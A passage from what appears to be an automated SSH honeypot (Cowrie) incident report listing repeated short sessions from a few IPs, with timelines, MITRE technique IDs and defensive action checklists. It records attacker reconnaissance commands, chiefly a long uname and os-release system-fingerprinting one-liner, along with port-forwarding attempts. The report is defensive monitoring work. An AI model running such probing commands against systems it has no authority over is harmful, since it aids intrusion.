| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-02 03:25:28` | `cowrie.session.connect` |
| `2026-08-02 03:25:29` | `cowrie.client.version` |
| `2026-08-02 03:25:29` | `cowrie.client.kex` |
| `2026-08-02 03:25:29` | `cowrie.login.success` |
| `2026-08-02 03:25:30` | `cowrie.session.params` |
| `2026-08-02 03:25:30` | `cowrie.command.input` |
| `2026-08-02 03:25:30` | `cowrie.command.input` |
| `2026-08-02 03:25:30` | `cowrie.command.input` |
| `2026-08-02 03:25:30` | `cowrie.command.input` |
| `2026-08-02 03:25:30` | `cowrie.command.input` |
| `2026-08-02 03:25:30` | `cowrie.command.success` |
| `2026-08-02 03:25:30` | `cowrie.command.input` |
| `2026-08-02 03:25:30` | `cowrie.command.input` |
| `2026-08-02 03:25:30` | `cowrie.command.input` |
| `2026-08-02 03:25:30` | `cowrie.command.input` |
| `2026-08-02 03:25:30` | `cowrie.log.closed` |
| `2026-08-02 03:25:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]42` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-93ca4ce06b2e

| Field | Detail |
|---|---|
| **Source IP** | `64.110.90[.]250` |
| **First Seen** | 2026-08-02 03:26 |
| **Last Seen** | 2026-08-02 03:26 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-02 03:26:48` | `cowrie.session.connect` |
| `2026-08-02 03:26:48` | `cowrie.client.version` |
| `2026-08-02 03:26:48` | `cowrie.client.kex` |
| `2026-08-02 03:26:49` | `cowrie.login.success` |
| `2026-08-02 03:26:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `64.110.90[.]250` to AbuseIPDB if not already reported
- [ ] Block `64.110.90[.]250` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-958eccf14756

| Field | Detail |
|---|---|
| **Source IP** | `64.110.90[.]250` |
| **First Seen** | 2026-08-02 03:26 |
| **Last Seen** | 2026-08-02 03:26 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-02 03:26:48` | `cowrie.session.connect` |
| `2026-08-02 03:26:48` | `cowrie.client.version` |
| `2026-08-02 03:26:49` | `cowrie.client.kex` |
| `2026-08-02 03:26:49` | `cowrie.login.success` |
| `2026-08-02 03:26:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `64.110.90[.]250` to AbuseIPDB if not already reported
- [ ] Block `64.110.90[.]250` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-23fd0221e390

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]238` |
| **First Seen** | 2026-08-02 03:26 |
| **Last Seen** | 2026-08-02 03:26 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-02 03:26:50` | `cowrie.session.connect` |
| `2026-08-02 03:26:50` | `cowrie.client.version` |
| `2026-08-02 03:26:50` | `cowrie.client.kex` |
| `2026-08-02 03:26:50` | `cowrie.login.success` |
| `2026-08-02 03:26:51` | `cowrie.session.params` |
| `2026-08-02 03:26:51` | `cowrie.command.input` |
| `2026-08-02 03:26:51` | `cowrie.log.closed` |
| `2026-08-02 03:26:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]238` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]238` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4621b7b5253d

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]42` |
| **First Seen** | 2026-08-02 03:27 |
| **Last Seen** | 2026-08-02 03:27 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-02 03:27:17` | `cowrie.session.connect` |
| `2026-08-02 03:27:17` | `cowrie.client.version` |
| `2026-08-02 03:27:17` | `cowrie.client.kex` |
| `2026-08-02 03:27:17` | `cowrie.login.success` |
| `2026-08-02 03:27:18` | `cowrie.session.params` |
| `2026-08-02 03:27:18` | `cowrie.command.input` |
| `2026-08-02 03:27:18` | `cowrie.command.input` |
| `2026-08-02 03:27:18` | `cowrie.command.input` |
| `2026-08-02 03:27:18` | `cowrie.command.input` |
| `2026-08-02 03:27:18` | `cowrie.command.input` |
| `2026-08-02 03:27:18` | `cowrie.command.success` |
| `2026-08-02 03:27:18` | `cowrie.command.input` |
| `2026-08-02 03:27:18` | `cowrie.command.input` |
| `2026-08-02 03:27:18` | `cowrie.command.input` |
| `2026-08-02 03:27:18` | `cowrie.command.input` |
| `2026-08-02 03:27:18` | `cowrie.log.closed` |
| `2026-08-02 03:27:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]42` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-958d9e5d3928

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]238` |
| **First Seen** | 2026-08-02 03:28 |
| **Last Seen** | 2026-08-02 03:28 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-02 03:28:26` | `cowrie.session.connect` |
| `2026-08-02 03:28:26` | `cowrie.client.version` |
| `2026-08-02 03:28:26` | `cowrie.client.kex` |
| `2026-08-02 03:28:27` | `cowrie.login.success` |
| `2026-08-02 03:28:27` | `cowrie.session.params` |
| `2026-08-02 03:28:27` | `cowrie.command.input` |
| `2026-08-02 03:28:27` | `cowrie.log.closed` |
| `2026-08-02 03:28:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]238` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]238` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c8651dcc4ac8

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]42` |
| **First Seen** | 2026-08-02 03:28 |
| **Last Seen** | 2026-08-02 03:28 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-02 03:28:36` | `cowrie.session.connect` |
| `2026-08-02 03:28:36` | `cowrie.client.version` |
| `2026-08-02 03:28:36` | `cowrie.client.kex` |
| `2026-08-02 03:28:37` | `cowrie.login.success` |
| `2026-08-02 03:28:38` | `cowrie.session.params` |
| `2026-08-02 03:28:38` | `cowrie.command.input` |
| `2026-08-02 03:28:38` | `cowrie.command.input` |
| `2026-08-02 03:28:38` | `cowrie.command.input` |
| `2026-08-02 03:28:38` | `cowrie.command.input` |
| `2026-08-02 03:28:38` | `cowrie.command.input` |
| `2026-08-02 03:28:38` | `cowrie.command.success` |
| `2026-08-02 03:28:38` | `cowrie.command.input` |
| `2026-08-02 03:28:38` | `cowrie.command.input` |
| `2026-08-02 03:28:38` | `cowrie.command.input` |
| `2026-08-02 03:28:38` | `cowrie.command.input` |
| `2026-08-02 03:28:39` | `cowrie.log.closed` |
| `2026-08-02 03:28:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]42` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-252f1327fcc9

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]42` |
| **First Seen** | 2026-08-02 03:29 |
| **Last Seen** | 2026-08-02 03:29 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-02 03:29:43` | `cowrie.session.connect` |
| `2026-08-02 03:29:43` | `cowrie.client.version` |
| `2026-08-02 03:29:43` | `cowrie.client.kex` |
| `2026-08-02 03:29:44` | `cowrie.login.success` |
| `2026-08-02 03:29:46` | `cowrie.session.params` |
| `2026-08-02 03:29:46` | `cowrie.command.input` |
| `2026-08-02 03:29:46` | `cowrie.command.input` |
| `2026-08-02 03:29:46` | `cowrie.command.input` |
| `2026-08-02 03:29:46` | `cowrie.command.input` |
| `2026-08-02 03:29:46` | `cowrie.command.input` |
| `2026-08-02 03:29:46` | `cowrie.command.success` |
| `2026-08-02 03:29:46` | `cowrie.command.input` |
| `2026-08-02 03:29:46` | `cowrie.command.input` |
| `2026-08-02 03:29:46` | `cowrie.command.input` |
| `2026-08-02 03:29:46` | `cowrie.command.input` |
| `2026-08-02 03:29:46` | `cowrie.log.closed` |
| `2026-08-02 03:29:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]42` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ca576fa75c81

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]238` |
| **First Seen** | 2026-08-02 03:30 |
| **Last Seen** | 2026-08-02 03:30 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-02 03:30:01` | `cowrie.session.connect` |
| `2026-08-02 03:30:01` | `cowrie.client.version` |
| `2026-08-02 03:30:01` | `cowrie.client.kex` |
| `2026-08-02 03:30:02` | `cowrie.login.success` |
| `2026-08-02 03:30:02` | `cowrie.session.params` |
| `2026-08-02 03:30:02` | `cowrie.command.input` |
| `2026-08-02 03:30:03` | `cowrie.log.closed` |
| `2026-08-02 03:30:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]238` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]238` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-eded49c29ea4

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]42` |
| **First Seen** | 2026-08-02 03:30 |
| **Last Seen** | 2026-08-02 03:30 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-02 03:30:47` | `cowrie.session.connect` |
| `2026-08-02 03:30:47` | `cowrie.client.version` |
| `2026-08-02 03:30:47` | `cowrie.client.kex` |
| `2026-08-02 03:30:49` | `cowrie.login.success` |
| `2026-08-02 03:30:50` | `cowrie.session.params` |
| `2026-08-02 03:30:50` | `cowrie.command.input` |
| `2026-08-02 03:30:50` | `cowrie.command.input` |
| `2026-08-02 03:30:50` | `cowrie.command.input` |
| `2026-08-02 03:30:50` | `cowrie.command.input` |
| `2026-08-02 03:30:50` | `cowrie.command.input` |
| `2026-08-02 03:30:50` | `cowrie.command.success` |
| `2026-08-02 03:30:50` | `cowrie.command.input` |
| `2026-08-02 03:30:50` | `cowrie.command.input` |
| `2026-08-02 03:30:50` | `cowrie.command.input` |
| `2026-08-02 03:30:50` | `cowrie.command.input` |
| `2026-08-02 03:30:50` | `cowrie.log.closed` |
| `2026-08-02 03:30:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]42` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a6f9abf9d1c3

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]238` |
| **First Seen** | 2026-08-02 03:31 |
| **Last Seen** | 2026-08-02 03:31 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-02 03:31:39` | `cowrie.session.connect` |
| `2026-08-02 03:31:39` | `cowrie.client.version` |
| `2026-08-02 03:31:39` | `cowrie.client.kex` |
| `2026-08-02 03:31:40` | `cowrie.login.success` |
| `2026-08-02 03:31:41` | `cowrie.session.params` |
| `2026-08-02 03:31:41` | `cowrie.command.input` |
| `2026-08-02 03:31:41` | `cowrie.log.closed` |
| `2026-08-02 03:31:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]238` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]238` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-338bf9fcdc25

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]42` |
| **First Seen** | 2026-08-02 03:31 |
| **Last Seen** | 2026-08-02 03:32 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-02 03:31:55` | `cowrie.session.connect` |
| `2026-08-02 03:31:55` | `cowrie.client.version` |
| `2026-08-02 03:31:56` | `cowrie.client.kex` |
| `2026-08-02 03:31:57` | `cowrie.login.success` |
| `2026-08-02 03:31:58` | `cowrie.session.params` |
| `2026-08-02 03:31:58` | `cowrie.command.input` |
| `2026-08-02 03:31:58` | `cowrie.command.input` |
| `2026-08-02 03:31:58` | `cowrie.command.input` |
| `2026-08-02 03:31:58` | `cowrie.command.input` |
| `2026-08-02 03:31:58` | `cowrie.command.input` |
| `2026-08-02 03:31:58` | `cowrie.command.success` |
| `2026-08-02 03:31:58` | `cowrie.command.input` |
| `2026-08-02 03:31:58` | `cowrie.command.input` |
| `2026-08-02 03:31:58` | `cowrie.command.input` |
| `2026-08-02 03:31:58` | `cowrie.command.input` |
| `2026-08-02 03:31:58` | `cowrie.log.closed` |
| `2026-08-02 03:32:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]42` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1a3df176c493

| Field | Detail |
|---|---|
| **Source IP** | `31.173.0[.]46` |
| **First Seen** | 2026-08-02 03:33 |
| **Last Seen** | 2026-08-02 03:33 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-02 03:33:01` | `cowrie.session.connect` |
| `2026-08-02 03:33:02` | `cowrie.client.version` |
| `2026-08-02 03:33:02` | `cowrie.client.kex` |
| `2026-08-02 03:33:03` | `cowrie.login.success` |
| `2026-08-02 03:33:03` | `cowrie.direct-tcpip.request` |
| `2026-08-02 03:33:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `31.173.0[.]46` to AbuseIPDB if not already reported
- [ ] Block `31.173.0[.]46` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c74e72b73927

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]42` |
| **First Seen** | 2026-08-02 03:33 |
| **Last Seen** | 2026-08-02 03:33 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-02 03:33:05` | `cowrie.session.connect` |
| `2026-08-02 03:33:06` | `cowrie.client.version` |
| `2026-08-02 03:33:06` | `cowrie.client.kex` |
| `2026-08-02 03:33:07` | `cowrie.login.success` |
| `2026-08-02 03:33:08` | `cowrie.session.params` |
| `2026-08-02 03:33:08` | `cowrie.command.input` |
| `2026-08-02 03:33:08` | `cowrie.command.input` |
| `2026-08-02 03:33:08` | `cowrie.command.input` |
| `2026-08-02 03:33:08` | `cowrie.command.input` |
| `2026-08-02 03:33:08` | `cowrie.command.input` |
| `2026-08-02 03:33:08` | `cowrie.command.success` |
| `2026-08-02 03:33:08` | `cowrie.command.input` |
| `2026-08-02 03:33:08` | `cowrie.command.input` |
| `2026-08-02 03:33:08` | `cowrie.command.input` |
| `2026-08-02 03:33:08` | `cowrie.command.input` |
| `2026-08-02 03:33:08` | `cowrie.log.closed` |
| `2026-08-02 03:33:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]42` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1257e1ec23e1

| Field | Detail |
|---|---|
| **Source IP** | `101.13.4[.]119` |
| **First Seen** | 2026-08-02 03:33 |
| **Last Seen** | 2026-08-02 03:33 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-02 03:33:08` | `cowrie.session.connect` |
| `2026-08-02 03:33:09` | `cowrie.client.version` |
| `2026-08-02 03:33:09` | `cowrie.client.kex` |
| `2026-08-02 03:33:11` | `cowrie.login.success` |
| `2026-08-02 03:33:12` | `cowrie.direct-tcpip.request` |
| `2026-08-02 03:33:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.13.4[.]119` to AbuseIPDB if not already reported
- [ ] Block `101.13.4[.]119` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5856bb8a07d0

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]238` |
| **First Seen** | 2026-08-02 03:33 |
| **Last Seen** | 2026-08-02 03:33 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-02 03:33:15` | `cowrie.session.connect` |
| `2026-08-02 03:33:15` | `cowrie.client.version` |
| `2026-08-02 03:33:15` | `cowrie.client.kex` |
| `2026-08-02 03:33:16` | `cowrie.login.success` |
| `2026-08-02 03:33:17` | `cowrie.session.params` |
| `2026-08-02 03:33:17` | `cowrie.command.input` |
| `2026-08-02 03:33:17` | `cowrie.log.closed` |
| `2026-08-02 03:33:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]238` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]238` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-15d7c66bba74

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]42` |
| **First Seen** | 2026-08-02 03:34 |
| **Last Seen** | 2026-08-02 03:34 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-02 03:34:13` | `cowrie.session.connect` |
| `2026-08-02 03:34:14` | `cowrie.client.version` |
| `2026-08-02 03:34:14` | `cowrie.client.kex` |
| `2026-08-02 03:34:16` | `cowrie.login.success` |
| `2026-08-02 03:34:17` | `cowrie.session.params` |
| `2026-08-02 03:34:17` | `cowrie.command.input` |
| `2026-08-02 03:34:17` | `cowrie.command.input` |
| `2026-08-02 03:34:17` | `cowrie.command.input` |
| `2026-08-02 03:34:17` | `cowrie.command.input` |
| `2026-08-02 03:34:17` | `cowrie.command.input` |
| `2026-08-02 03:34:17` | `cowrie.command.success` |
| `2026-08-02 03:34:17` | `cowrie.command.input` |
| `2026-08-02 03:34:17` | `cowrie.command.input` |
| `2026-08-02 03:34:17` | `cowrie.command.input` |
| `2026-08-02 03:34:17` | `cowrie.command.input` |
| `2026-08-02 03:34:18` | `cowrie.log.closed` |
| `2026-08-02 03:34:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]42` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-138398411b09

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]238` |
| **First Seen** | 2026-08-02 03:34 |
| **Last Seen** | 2026-08-02 03:34 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

